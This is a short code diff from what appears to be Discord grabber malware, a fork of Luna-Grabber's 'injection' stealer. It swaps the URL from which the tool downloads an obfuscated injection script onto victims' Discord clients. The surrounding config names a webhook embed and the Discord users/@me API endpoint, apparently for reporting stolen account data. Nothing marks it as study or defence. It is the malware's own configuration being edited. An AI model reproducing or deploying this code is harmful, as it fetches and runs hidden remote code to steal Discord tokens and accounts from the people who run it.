@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Emilis Injection', 
   embed_icon: 'https://us-tuna-sounds-images.voicemod.net/01b05fa1-517c-45cc-8898-dd1e23ed13d7-1713470646777.png', 
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/EmiHackk/Injection/main/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
